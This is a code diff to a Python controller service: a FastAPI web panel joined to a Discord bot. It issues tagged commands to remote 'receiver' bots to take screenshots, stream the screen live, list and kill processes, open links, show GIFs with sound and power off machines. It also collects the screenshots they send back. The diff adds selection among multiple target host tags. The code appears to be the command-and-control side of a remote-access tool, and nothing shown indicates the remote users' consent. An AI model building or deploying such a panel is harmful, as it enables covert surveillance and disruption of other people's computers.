@@ -1,10 +1,40 @@
 # main.py
 import asyncio
+import importlib
 import json
 import os
+import re
+import subprocess
 import sys
 from pathlib import Path
 from typing import Set, List, Dict
+
+
+def ensure_dependencies():
+    """
+    Install required third-party packages before the rest of the app imports.
+    """
+    required = {
+        "discord": "discord.py",
+        "fastapi": "fastapi",
+    }
+    missing = []
+    for module_name, package_name in required.items():
+        try:
+            importlib.import_module(module_name)
+        except ImportError:
+            missing.append(package_name)
+    if not missing:
+        return
+    print(f"Installing missing packages: {', '.join(missing)}")
+    try:
+        subprocess.check_call([sys.executable, "-m", "pip", "install", *missing])
+    except Exception as exc:  # noqa: BLE001
+        print(f"Failed to install required packages: {exc}")
+        sys.exit(1)
+
+
+ensure_dependencies()
 
 import discord
 from discord.ext import commands
@@ -12,9 +42,7 @@ from fastapi import FastAPI, WebSocket, WebSocketDisconnect, Query
 from fastapi.responses import HTMLResponse, JSONResponse
 from fastapi.staticfiles import StaticFiles
 
-print("Starting FastAPI + Discord controller service...")
-
-# ====== CONFIG ======
+# ====== CONFIG (use env vars) ======
 CONTROLLER_TOKEN = os.getenv("CONTROLLER_TOKEN", "")
 COMMAND_CHANNEL_ID = int(os.getenv("COMMAND_CHANNEL_ID", "0"))
 TARGET_CHANNEL_ID  = int(os.getenv("TARGET_CHANNEL_ID", "0"))
@@ -22,31 +50,77 @@ BOT_TAG = "[BOT1]"
 
 assert CONTROLLER_TOKEN, "Set CONTROLLER_TOKEN env var"
 assert COMMAND_CHANNEL_ID and TARGET_CHANNEL_ID, "Set COMMAND/TARGET channel IDs"
-# ====================
-
-
-# ====== Storage (Render-safe) ======
-ROOT_DIR = Path(__file__).resolve().parent
-DATA_DIR = Path("/tmp/data")
-DATA_DIR.mkdir(parents=True, exist_ok=True)
 # ===================================
 
+KNOWN_TAGS: Set[str] = {BOT_TAG}
+ACTIVE_BOT_TAG = BOT_TAG
 
-# ====== Optional system beep ======
+# Storage for files (screenshots)
+ROOT_DIR = Path(__file__).resolve().parent
+DATA_DIR = Path("./data")
+DATA_DIR.mkdir(exist_ok=True)
+
+TAG_PATTERN = re.compile(r"^\\s*(\\[[^\\]\\r\\n]{2,32}\\])")
+
+def _register_tag(tag: str) -> str:
+    """
+    Normalize and record a tag string.
+    """
+    tag_clean = tag.strip()
+    if not tag_clean:
+        return ACTIVE_BOT_TAG
+    KNOWN_TAGS.add(tag_clean)
+    return tag_clean
+
+
+def _set_active_tag(tag: str) -> str:
+    """
+    Update the active tag used for outgoing commands.
+    """
+    global ACTIVE_BOT_TAG
+    ACTIVE_BOT_TAG = _register_tag(tag)
+    return ACTIVE_BOT_TAG
+
+
+def _extract_tag(content: str):
+    """
+    Try to pull a leading [TAG] prefix from a receiver message.
+    """
+    if not content:
+        return None
+    match = TAG_PATTERN.match(content)
+    if match:
+        return _register_tag(match.group(1))
+    return None
+
+
+def _resolve_tag(tag: str = "") -> str:
+    """
+    Use the provided tag or fall back to the current active tag.
+    """
+    if tag and tag.strip():
+        return _register_tag(tag)
+    return ACTIVE_BOT_TAG
+
 def play_tune(duration_sec: float = 5.0) -> None:
+    """
+    Play a short Jingle Bells motif (~5 seconds).
+    """
     try:
         if os.name == "nt":
             import winsound
+
+            # Jingle Bells: E E E | E E E | E G C D E
             seq = [
-                (659, 300), (659, 300), (659, 600),
-                (0, 120),
-                (659, 300), (659, 300), (659, 600),
-                (0, 120),
-                (659, 300), (784, 300), (523, 300),
-                (587, 300), (659, 700),
+                (659, 300), (659, 300), (659, 600),  # E E E
+                (0,   120),
+                (659, 300), (659, 300), (659, 600),  # E E E
+                (0,   120),
+                (659, 300), (784, 300), (523, 300),  # E G C
+                (587, 300), (659, 700),              # D E
             ]
             total = sum(t for _, t in seq)
-            scale = (duration_sec * 1000) / total if total else 1.0
+            scale = duration_sec * 1000 / total if total else 1.0
             for freq, ms in seq:
                 dur = max(60, int(ms * scale))
                 if freq > 0:
@@ -56,6 +130,7 @@ def play_tune(duration_sec: float = 5.0) -> None:
                     time.sleep(dur / 1000)
         else:
             import time
+
             end = time.time() + duration_sec
             pattern = [0.1, 0.1, 0.2, 0.1, 0.1, 0.2, 0.1, 0.15, 0.1, 0.1, 0.2]
             idx = 0
@@ -65,10 +140,8 @@ def play_tune(duration_sec: float = 5.0) -> None:
                 idx += 1
     except Exception:
         print("\a", end="", flush=True)
-# ==================================
 
-
-# ====== Discord bot ======
+# ---------- Discord controller bot ----------
 intents = discord.Intents.default()
 intents.message_content = True
 bot = commands.Bot(command_prefix="?", intents=intents)
@@ -82,13 +155,11 @@ async def _get_channel(channel_id: int):
 
 @bot.event
 async def on_ready():
-    print(f"Controller bot logged in as {bot.user}")
+    print(f"✅ Controller bot logged in as {bot.user}")
     play_tune()
     _controller_ready.set()
-# =========================
 
-
-# ====== WebSocket Hub ======
+# WebSocket broadcast hub
 class Hub:
     def __init__(self):
         self.clients: Set[WebSocket] = set()
@@ -116,24 +187,22 @@ class Hub:
                 self.clients.discard(ws)
 
 hub = Hub()
-# ============================
 
-
-# ====== Discord → Web UI pushes ======
+# Listen for receiver outputs and push to UI
 @bot.event
 async def on_message(message: discord.Message):
     await bot.process_commands(message)
-
     if message.author.bot and message.channel.id == TARGET_CHANNEL_ID:
+        tag = _extract_tag(message.content or "")
         payload = {
             "type": "text",
             "author": str(message.author),
             "content": message.content,
             "attachments": [],
-            "ts": message.created_at.isoformat()
+            "ts": message.created_at.isoformat(),
+            "tag": tag,
         }
-
-        # Save attachments (screenshots)
+        # Save any attachments (e.g., screenshot.png)
         for att in message.attachments:
             try:
                 b = await att.read()
@@ -146,20 +215,14 @@ async def on_message(message: discord.Message):
                     "url": f"/files/{fname}"
                 })
             except Exception as e:
-                payload["attachments"].append({
-                    "filename": att.filename,
-                    "error": str(e)
-                })
-
+                payload["attachments"].append({"filename": att.filename, "error": str(e)})
         await hub.broadcast(payload)
-# =======================================
 
-
-# ====== FastAPI App ======
-app = FastAPI(title="Controller Panel")
+# ---------- FastAPI app ----------
+app = FastAPI(title="Local Controller Panel")
 app.mount("/files", StaticFiles(directory=str(DATA_DIR)), name="files")
 
-
+# NEW: list files for screenshots tab persistence
 @app.get("/files_index")
 async def files_index(limit: int = 24):
     items: List[Dict[str, str]] = []
@@ -171,12 +234,8 @@ async def files_index(limit: int = 24):
                 "mtime": p.stat().st_mtime
             })
     return {"files": items}
-# ========================
 
-
-# ====== CONTROL PANEL HTML ======
-# (full HTML is unchanged, I keep it 1:1)
-PANEL_HTML = """<!doctype html>
+PANEL_HTML = r"""<!doctype html>
 <html lang="en">
 <head>
   <meta charset="utf-8"/>
@@ -193,6 +252,9 @@ PANEL_HTML = """<!doctype html>
     header.hero{display:flex; align-items:center; justify-content:space-between; gap:12px; flex-wrap:wrap; padding:16px 18px; border:1px solid var(--line); border-radius:14px; background:rgba(16,21,33,.85); backdrop-filter:blur(6px);}
     h1{margin:4px 0 0; font-size:24px;} .eyebrow{letter-spacing:0.28px; text-transform:uppercase; font-size:12px; color:var(--muted);}
     .status{display:flex; gap:8px; flex-wrap:wrap; align-items:center;} .pill{display:inline-flex; align-items:center; gap:8px; padding:7px 11px; border:1px solid var(--line); border-radius:10px; background:var(--card); font-weight:700;} .dot{width:10px; height:10px; border-radius:50%; background:#f5c04a;} .dot.ok{background:#5fe0c5;} .dot.bad{background:var(--danger);}
+    .tag-control{display:grid; gap:6px; padding:8px 10px; border:1px solid var(--line); border-radius:10px; background:var(--card); min-width:240px;}
+    .tag-row{display:flex; gap:6px; align-items:center; flex-wrap:wrap;} .tag-row input{flex:1; min-width:160px;}
+    .tag-meta{font-size:12px; color:var(--muted);}
     .shell{margin-top:16px; border:1px solid var(--line); border-radius:16px; background:var(--panel); box-shadow:0 20px 50px rgba(0,0,0,.35); overflow:hidden;}
     .tabbar{display:flex; gap:8px; padding:12px; border-bottom:1px solid var(--line); background:rgba(17,25,42,.75);}
     .tab-btn{flex:1; border:1px solid var(--line); background:var(--card); color:var(--text); padding:10px 12px; border-radius:10px; cursor:pointer; font-weight:700; letter-spacing:0.2px; transition:all .18s ease;} 
@@ -203,7 +265,7 @@ PANEL_HTML = """<!doctype html>
     .grid{display:grid; grid-template-columns:1.05fr .95fr; gap:14px;} @media(max-width:960px){.grid{grid-template-columns:1fr;}}
     .card{border:1px solid var(--line); border-radius:12px; background:var(--card); padding:14px;}
     .head{display:flex; justify-content:space-between; gap:10px; align-items:center; flex-wrap:wrap; margin-bottom:10px;} h3{margin:0;}
-    .btn{border:1px solid var(--line); background:var(--card); color:var(--text); padding:9px 12px; border-radius:10px; font-weight:700; cursor:pointer; transition:transform .08s ease, filter .15s ease;} .btn:hover{filter:brightness(1.06); transform:translateY(-1px);} .btn.primary{background:linear-gradient(120deg,var(--accent),var(--accent2)); color:#061021; border:none;} .btn.danger{background:var(--danger); border-color:var(--danger); color:#061021;}
+    .btn{border:1px solid var(--line); background:var(--card); color:var(--text); padding:9px 12px; border-radius:10px; font-weight:700; cursor:pointer; transition:transform .08s ease, filter .15s ease;} .btn:hover{filter:brightness(1.06); transform:translateY(-1px);} .btn.primary{background:linear-gradient(120deg,var(--accent),var(--accent2)); color:#061021; border:none;} .btn.danger{background:var(--danger); border-color:var(--danger); color:#061021;} .btn.small{padding:7px 10px; font-size:13px;}
     .stack{display:grid; gap:10px;} .row{display:flex; gap:8px; flex-wrap:wrap;} input{flex:1; min-width:220px; padding:10px 12px; border-radius:10px; border:1px solid var(--line); background:#0a0f1a; color:var(--text);} label{font-weight:700;}
     .feed{display:flex; flex-direction:column; gap:10px; max-height:420px; overflow:auto; padding-right:4px;} .feed.small{max-height:360px;} .item{border:1px solid var(--line); border-radius:10px; padding:10px 12px; background:rgba(14,19,30,.9);} .meta{font-size:12px; color:var(--muted); margin-bottom:6px; word-break:break-word;}
     .gallery{display:grid; grid-template-columns: repeat(auto-fit, minmax(200px,1fr)); gap:10px;} .shot{border:1px solid var(--line); border-radius:12px; overflow:hidden; background:#0b0f19; cursor:pointer;} .shot img{width:100%; display:block;}
@@ -221,7 +283,16 @@ PANEL_HTML = """<!doctype html>
       <div class="status">
         <div class="pill"><span id="dot" class="dot"></span><span id="stxt">Connecting...</span></div>
         <div class="pill">Cmd {COMMAND_CHANNEL_ID}</div>
-        <div class="pill">Tag {BOT_TAG}</div>
+        <div class="tag-control">
+          <div class="tag-meta">Target tag</div>
+          <div class="tag-row">
+            <input id="tagInput" list="tagOptions" placeholder="[HOST-XXXX]" value="{BOT_TAG}"/>
+            <datalist id="tagOptions"></datalist>
+            <button class="btn small" onclick="chooseTag()">Use</button>
+            <button class="btn small" onclick="refreshTags()" title="Refresh known tags">&#8635;</button>
+          </div>
+          <div class="tag-meta">Active: <span id="tagActive">{BOT_TAG}</span></div>
+        </div>
         <div class="pill" id="uptime">00:00</div>
       </div>
     </header>
@@ -321,11 +392,19 @@ PANEL_HTML = """<!doctype html>
   <div id="toast"></div>
 
   <script>
-    const el = {dot:document.getElementById('dot'), stxt:document.getElementById('stxt'), timeline:document.getElementById('timeline'), gallery:document.getElementById('gallery'), procFeed:document.getElementById('procFeed'), logFeed:document.getElementById('logFeed'), uptime:document.getElementById('uptime')};
+    const el = {dot:document.getElementById('dot'), stxt:document.getElementById('stxt'), timeline:document.getElementById('timeline'), gallery:document.getElementById('gallery'), procFeed:document.getElementById('procFeed'), logFeed:document.getElementById('logFeed'), uptime:document.getElementById('uptime'), tagActive:document.getElementById('tagActive'), tagInput:document.getElementById('tagInput')};
+    let currentTag = "{BOT_TAG}";
+    let knownTags = new Set([currentTag]);
     let startedAt = Date.now(); setInterval(()=>{ const s=((Date.now()-startedAt)/1000|0); const m=(s/60|0), ss=s%60; el.uptime.textContent=`${String(m).padStart(2,'0')}:${String(ss).padStart(2,'0')}`; },1000);
 
     function setStatus(ok){ el.dot.className='dot '+(ok?'ok':'bad'); el.stxt.textContent = ok ? 'Connected' : 'Reconnecting...'; }
     function toast(t){ const n=document.getElementById('toast'); n.textContent=t; n.style.opacity='1'; setTimeout(()=> n.style.opacity='0', 1500); }
+
+    function renderTags(){ if(el.tagActive) el.tagActive.textContent = currentTag || '(none)'; const dl=document.getElementById('tagOptions'); if(dl){ dl.innerHTML=''; Array.from(knownTags).sort().forEach(t=>{ const o=document.createElement('option'); o.value=t; dl.appendChild(o); }); } if(el.tagInput && !el.tagInput.value) el.tagInput.value=currentTag; }
+    async function refreshTags(){ try{ const r = await fetch('/tags'); const data = await r.json().catch(()=>({})); if(data.tags) knownTags = new Set(data.tags); if(data.active) currentTag = data.active; } catch(e){} renderTags(); }
+    async function chooseTag(){ const val=(el.tagInput?.value||'').trim(); if(!val){ toast('Enter a tag'); return; } currentTag = val; try{ const r = await fetch('/tags/select?tag='+encodeURIComponent(val), {method:'POST'}); const data = await r.json().catch(()=>({})); if(data.tags) knownTags = new Set(data.tags); if(data.active) currentTag = data.active; toast('Now targeting '+currentTag); } catch(e){ toast('Could not set tag'); } renderTags(); }
+    function withTag(path){ const u=new URL(path, window.location.origin); if(currentTag) u.searchParams.set('tag', currentTag); return u.pathname + u.search; }
+    function touchTagFromMessage(obj){ if(obj && obj.tag){ knownTags.add(obj.tag); if(!currentTag) currentTag = obj.tag; renderTags(); } }
 
     function node(author, content, ts){ const d=document.createElement('div'); d.className='item'; const m=document.createElement('div'); m.className='meta'; const time=ts? new Date(ts).toLocaleString(): new Date().toLocaleString(); m.textContent = `${time} - ${author}`; const b=document.createElement('div'); b.textContent = content || ''; d.appendChild(m); d.appendChild(b); return d; }
     function addFeed(container, div, limit=200){ container.prepend(div); while(container.children.length>limit) container.lastChild.remove(); }
@@ -344,10 +423,10 @@ PANEL_HTML = """<!doctype html>
     }
     document.querySelectorAll('.tab-btn').forEach(btn=> btn.onclick = ()=> setTab(btn.dataset.tab));
 
-    function connectWS(){ setStatus(false); const ws = new WebSocket((location.protocol==='https:'?'wss://':'ws://') + location.host + '/ws'); ws.onopen = ()=> setStatus(true); ws.onclose = ()=> { setStatus(false); setTimeout(connectWS, 1200); }; ws.onmessage = ev => { const obj = JSON.parse(ev.data); if(obj.type !== 'text') return; const msg = node(obj.author, obj.content, obj.ts); addFeed(el.timeline, msg.cloneNode(true)); addLog(msg.cloneNode(true)); if(obj.content && obj.content.toLowerCase().includes('filtered running processes')) addFeed(el.procFeed, msg.cloneNode(true)); if(obj.attachments && obj.attachments.length){ obj.attachments.forEach(a=> addShot(a.url)); } }; }
-    connectWS();
+    function connectWS(){ setStatus(false); const ws = new WebSocket((location.protocol==='https:'?'wss://':'ws://') + location.host + '/ws'); ws.onopen = ()=> setStatus(true); ws.onclose = ()=> { setStatus(false); setTimeout(connectWS, 1200); }; ws.onmessage = ev => { const obj = JSON.parse(ev.data); if(obj.type !== 'text') return; touchTagFromMessage(obj); const msg = node(obj.author, obj.content, obj.ts); addFeed(el.timeline, msg.cloneNode(true)); addLog(msg.cloneNode(true)); if(obj.content && obj.content.toLowerCase().includes('filtered running processes')) addFeed(el.procFeed, msg.cloneNode(true)); if(obj.attachments && obj.attachments.length){ obj.attachments.forEach(a=> addShot(a.url)); } }; }
+    connectWS(); refreshTags(); renderTags();
 
-    async function post(path){ const r = await fetch(path,{method:'POST'}); const data = await r.json().catch(()=>({})); if(!r.ok) throw new Error(data.error||'Request failed'); return data; }
+    async function post(path){ const r = await fetch(withTag(path),{method:'POST'}); const data = await r.json().catch(()=>({})); if(!r.ok) throw new Error(data.error||'Request failed'); return data; }
     async function startLive(){ const m=document.getElementById('monitorIdx').value.trim()||'1'; try{ await post('/cmd/live_start?monitor='+encodeURIComponent(m)); toast('Live stream starting'); } catch(e){ toast(e.message);} }
     async function viewStream(){ const url=document.getElementById('streamUrl').value.trim(); if(!url){toast('Enter stream URL'); return;} try{ await post('/cmd/show_stream?url='+encodeURIComponent(url)); toast('Stream overlay sent'); } catch(e){ toast(e.message);} }
     async function doShot(){ try{ await post('/cmd/ss'); toast('Screenshot requested'); } catch(e){ toast(e.message);} }
@@ -361,41 +440,35 @@ PANEL_HTML = """<!doctype html>
     fetch('/files_index').then(r=>r.json()).then(j=>{ (j.files||[]).forEach(f=> addShot(f.url)); }).catch(()=>{});
   </script>
 </body>
-</html>""" 
-
-
+</html>
+""".replace("{COMMAND_CHANNEL_ID}", str(COMMAND_CHANNEL_ID)).replace("{BOT_TAG}", BOT_TAG)
+ 
 @app.get("/", response_class=HTMLResponse)
 async def index():
     return HTMLResponse(PANEL_HTML)
-
 
 @app.websocket("/ws")
 async def ws_endpoint(ws: WebSocket):
     try:
         await hub.connect(ws)
-        await ws.send_text(json.dumps({
-            "type": "text",
-            "author": "Panel",
-            "content": "Connected to live stream.",
-            "attachments": [],
-            "ts": ""
-        }))
+        await ws.send_text(json.dumps({"type":"text","author":"Panel","content":"Connected to live stream.","attachments":[], "ts": ""}))
         while True:
             await ws.receive_text()
     except WebSocketDisconnect:
         await hub.disconnect(ws)
     except Exception:
         await hub.disconnect(ws)
-# ========================================
 
-
-# ====== Discord Command Senders ======
+# ---------- HTTP endpoints to send Discord commands ----------
 async def _send_cmd(msg: str):
     await _controller_ready.wait()
     ch = await _get_channel(COMMAND_CHANNEL_ID)
     await ch.send(msg)
 
 async def _send_cmd_with_file(msg: str, file_path: Path):
+    """
+    Send a command message and attach a file if provided.
+    """
     await _controller_ready.wait()
     ch = await _get_channel(COMMAND_CHANNEL_ID)
     async with ch.typing():
@@ -403,6 +476,9 @@ async def _send_cmd_with_file(msg: str, file_path: Path):
             await ch.send(msg, file=discord.File(f, filename=file_path.name))
 
 async def _send_cmd_with_files(msg: str, file_paths: List[Path]):
+    """
+    Send a command message with multiple file attachments.
+    """
     await _controller_ready.wait()
     ch = await _get_channel(COMMAND_CHANNEL_ID)
     files = []
@@ -416,51 +492,50 @@ async def _send_cmd_with_files(msg: str, file_paths: List[Path]):
             await ch.send(msg, files=files)
     finally:
         for h in handles:
-            try: h.close()
-            except: pass
-# =====================================
+            try:
+                h.close()
+            except Exception:
+                pass
 
-
-# ====== HTTP API → Discord Commands ======
 @app.post("/cmd/ss")
-async def cmd_ss():
-    await _send_cmd(f"{BOT_TAG} REQUEST_SCREENSHOT")
-    return {"ok": True}
+async def cmd_ss(tag: str = Query(None)):
+    await _send_cmd(f"{_resolve_tag(tag)} REQUEST_SCREENSHOT")
+    return JSONResponse({"ok": True})
 
 @app.post("/cmd/ps")
-async def cmd_ps():
-    await _send_cmd(f"{BOT_TAG} LIST_PROCESSES")
-    return {"ok": True}
+async def cmd_ps(tag: str = Query(None)):
+    await _send_cmd(f"{_resolve_tag(tag)} LIST_PROCESSES")
+    return JSONResponse({"ok": True})
 
 @app.post("/cmd/open")
-async def cmd_open(url: str = Query(..., min_length=1)):
+async def cmd_open(url: str = Query(..., min_length=1), tag: str = Query(None)):
     if not (url.startswith("http://") or url.startswith("https://")):
         url = "http://" + url
-    await _send_cmd(f"{BOT_TAG} OPEN_LINK {url}")
-    return {"ok": True, "url": url}
+    await _send_cmd(f"{_resolve_tag(tag)} OPEN_LINK {url}")
+    return JSONResponse({"ok": True, "url": url})
 
 @app.post("/cmd/close")
-async def cmd_close(name: str = Query(..., min_length=1)):
-    await _send_cmd(f"{BOT_TAG} KILL_PROCESS {name}")
-    return {"ok": True}
+async def cmd_close(name: str = Query(..., min_length=1), tag: str = Query(None)):
+    await _send_cmd(f"{_resolve_tag(tag)} KILL_PROCESS {name}")
+    return JSONResponse({"ok": True, "name": name})
 
 @app.post("/cmd/poweroff")
-async def cmd_poweroff():
-    await _send_cmd(f"{BOT_TAG} POWER_OFF")
-    return {"ok": True}
+async def cmd_poweroff(tag: str = Query(None)):
+    await _send_cmd(f"{_resolve_tag(tag)} POWER_OFF")
+    return JSONResponse({"ok": True})
 
 @app.post("/cmd/live_start")
-async def cmd_live_start(monitor: int = Query(1, ge=1)):
-    await _send_cmd(f"{BOT_TAG} START_LIVE {monitor}")
-    return {"ok": True}
+async def cmd_live_start(monitor: int = Query(1, ge=1), tag: str = Query(None)):
+    await _send_cmd(f"{_resolve_tag(tag)} START_LIVE {monitor}")
+    return JSONResponse({"ok": True, "monitor": monitor})
 
 @app.post("/cmd/show_stream")
-async def cmd_show_stream(url: str = Query(..., min_length=1)):
-    await _send_cmd(f"{BOT_TAG} SHOW_STREAM {url}")
-    return {"ok": True}
+async def cmd_show_stream(url: str = Query(..., min_length=1), tag: str = Query(None)):
+    await _send_cmd(f"{_resolve_tag(tag)} SHOW_STREAM {url}")
+    return JSONResponse({"ok": True, "url": url})
 
 @app.post("/cmd/display_gif")
-async def cmd_display_gif():
+async def cmd_display_gif(tag: str = Query(None)):
     gif_path = ROOT_DIR / "display.gif"
     sound_path = ROOT_DIR / "sound.mp3"
     missing = []
@@ -469,18 +544,27 @@ async def cmd_display_gif():
     if not sound_path.is_file():
         missing.append("sound.mp3")
     if missing:
-        return JSONResponse({"ok": False, "error": f"Missing: {', '.join(missing)}"}, status_code=404)
+        return JSONResponse({"ok": False, "error": f"Missing file(s): {', '.join(missing)} next to main.py"}, status_code=404)
+    try:
+        await _send_cmd_with_files(f"{_resolve_tag(tag)} DISPLAY_GIF", [gif_path, sound_path])
+    except Exception as e:
+        return JSONResponse({"ok": False, "error": str(e)}, status_code=500)
+    return JSONResponse({"ok": True})
 
-    await _send_cmd_with_files(f"{BOT_TAG} DISPLAY_GIF", [gif_path, sound_path])
-    return {"ok": True}
+@app.get("/tags")
+async def list_tags():
+    return {"active": ACTIVE_BOT_TAG, "tags": sorted(KNOWN_TAGS)}
+
+@app.post("/tags/select")
+async def select_tag(tag: str = Query(..., min_length=1)):
+    active = _set_active_tag(tag)
+    return {"ok": True, "active": active, "tags": sorted(KNOWN_TAGS)}
 
 @app.get("/health")
 async def health():
     return {"ok": True}
-# ==========================================
 
-
-# ====== Startup / Shutdown ======
+# ---------- Run Discord bot in the same process ----------
 @app.on_event("startup")
 async def _startup():
     asyncio.create_task(bot.start(CONTROLLER_TOKEN))
@@ -488,5 +572,3 @@ async def _startup():
 @app.on_event("shutdown")
 async def _shutdown():
     await bot.close()
-# =================================
-
